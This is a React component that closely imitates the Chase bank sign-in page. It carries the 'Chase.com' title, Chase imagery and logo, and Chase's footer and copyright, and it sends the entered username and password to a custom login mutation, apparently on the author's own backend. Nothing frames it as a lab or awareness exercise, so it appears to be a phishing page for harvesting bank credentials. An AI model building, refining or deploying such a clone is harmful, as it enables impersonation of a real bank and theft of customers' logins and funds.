import { useState } from "react";
import logo from "../assets/image-copy.png"
import { useLogin } from "../hooks/mutations/useLogin";
import {Helmet} from "react-helmet-async"

const FB  = () => <i className="fa-brands fa-square-facebook" />;
const IG  = () => <i className="fa-brands fa-instagram" />;
const X   = () => <i className="fa-brands fa-x-twitter" />;
const YT  = () => <i className="fa-brands fa-youtube" />;
const LI  = () => <i className="fa-brands fa-linkedin-in" />;

const FOOTER_LINKS_TOP = [
  "Contact us", "Privacy & security", "Terms of use", "Accessibility",
  "SAFE Act: Chase Mortgage Loan Originators", "Fair Lending",
  "About Chase", "J.P. Morgan", "JPMorgan Chase & Co.",
];

const FOOTER_LINKS_BOT = [
  "Careers", "Español", "Chase Canada", "Site map",
  "Member FDIC", "🏠 Equal Housing Opportunity",
];

export default function SignIn() {
  const [showPass,    setShowPass]    = useState(false);
  const [rememberMe,  setRememberMe]  = useState(false);
  const [useToken,    setUseToken]    = useState(false);



  const [form, setForm] = useState({
    username: "",
    password: "",
    remember: false
  });

  const loginMutation = useLogin();

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;

    setForm((prev) => ({
      ...prev,
      [name]: type === "checkbox" ? checked : value
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    loginMutation.mutate({
      username: form.username,
      password: form.password
    });

    
  };





  return (
    <>
      <Helmet>
        <title>Sign in - Chase.com</title>
      </Helmet>

      <link
        rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
      />

      <div className="min-h-screen flex flex-col font-sans">

        {/* ── Hero wrapper ──────────────────────────────────────────────── */}
        <div
          className="flex-1 flex flex-col"
          style={{
            backgroundImage: `url("https://static.chasecdn.com/content/services/rendition/image.xsmall.jpg/structured-images/geo-images/background/new_york/new_york_night_6.jpg")`,
            backgroundSize: "cover",
            backgroundPosition: "center",
          }}
        >
          {/* Header */}
          <header
            className="h-[90px] flex items-center justify-center"
            style={{ backgroundImage: "linear-gradient(to bottom, rgba(0,0,0,0.7), rgba(0,0,0,0.5), transparent)" }}
          >
            <img
              src={logo}
              alt="Chase"
              className="max-w-[180px] relative z-10"
            />
          </header>

          {/* Main */}
          <main className="flex-1 flex items-center justify-center px-4 py-8">
            <div className="bg-white w-full max-w-[420px] rounded-lg shadow-[0_15px_35px_rgba(0,0,0,0.35)] px-7 py-8">

              <form onSubmit={handleSubmit}>
                {/* Django CSRF */}
               
                {/* Username */}
                <div className="mb-5">
                  <label className="block text-sm text-gray-800 mb-1">Username</label>
                  <input
                    name="username"
          type="text"
          placeholder="Username"
          value={form.username}
          onChange={handleChange}
          required
                    className="w-full border-0 border-b-2 border-gray-300 px-1 py-2 text-[15px] text-black outline-none focus:border-blue-600 transition-colors bg-transparent"
                  />
                </div>

                {/* Password */}
                <div className="mb-5 relative">
                  <label className="block text-sm text-gray-800 mb-1">Password</label>
                  <input
                    name="password"
          type="password"
          placeholder="Password"
          value={form.password}
          onChange={handleChange}
          required
                    className="w-full border-0 border-b-2 border-gray-300 px-1 py-2 text-[15px] text-black outline-none focus:border-blue-600 transition-colors bg-transparent pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPass((p) => !p)}
                    className="absolute right-0 top-8 text-blue-600 text-sm bg-transparent border-none cursor-pointer hover:underline"
                  >
                    {showPass ? "Hide" : "Show"}
                  </button>
                </div>

                {/* Options */}
                <div className="flex justify-between items-center my-3 mb-5 text-sm text-gray-700">
                  <label className="flex items-center gap-2 cursor-pointer select-none">
                    <input
                      type="checkbox"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="accent-blue-600"
                    />
                    Remember me
                  </label>
                  <label className="flex items-center gap-2 cursor-pointer select-none">
                    <input
                      type="checkbox"
                      checked={useToken}
                      onChange={(e) => setUseToken(e.target.checked)}
                      className="accent-blue-600"
                    />
                    Use token
                  </label>
                </div>

                {/* Error */}

                {loginMutation.isError && (
          <p className="text-red-600 text-xs">
            {loginMutation.error?.error || "Login failed"}
          </p>
        )}
              

                {/* Submit */}
                <button
                  type="submit"
                  className="w-full bg-blue-600 hover:bg-blue-800 text-white text-base font-medium py-3 rounded-md transition-colors cursor-pointer border-none"
                >
                   {loginMutation.isPending ? "Signing in..." : "Sign in"}
                </button>
              </form>

              
              <div className="mt-5 text-sm space-y-2">
                {["Forgot username/password?", "Not enrolled? Sign up now."].map((text) => (
                  <a
                    key={text}
                    href="#"
                    className="block text-blue-600 hover:underline after:content-['_›']"
                  >
                    {text}
                  </a>
                ))}
              </div>
            </div>
          </main>
        </div>

        {/* ── Footer ────────────────────────────────────────────────────── */}
        <footer className="bg-[#f6f6f6] px-4 py-5 text-center text-[13px] text-gray-500">

          {/* Social */}
          <div className="flex justify-center gap-5 mb-4 text-[18px] text-[#696464]">
            {[FB, IG, X, YT, LI].map((Icon, i) => (
              <span key={i} className="cursor-pointer hover:text-gray-600 transition-colors">
                <Icon />
              </span>
            ))}
          </div>

          {/* Links — row 1 */}
          <div className="leading-7">
            {FOOTER_LINKS_TOP.map((label) => (
              <a key={label} href="#" className="text-gray-500 underline mx-1.5 whitespace-nowrap hover:text-gray-700">
                {label}
              </a>
            ))}
          </div>

          {/* Links — row 2 */}
          <div className="leading-7">
            {FOOTER_LINKS_BOT.map((label) => (
              <a key={label} href="#" className="text-gray-500 underline mx-1.5 whitespace-nowrap hover:text-gray-700">
                {label}
              </a>
            ))}
          </div>

          <div className="mt-3 text-xs">© 2025 JPMorgan Chase</div>
        </footer>
      </div>
    </>
  );
}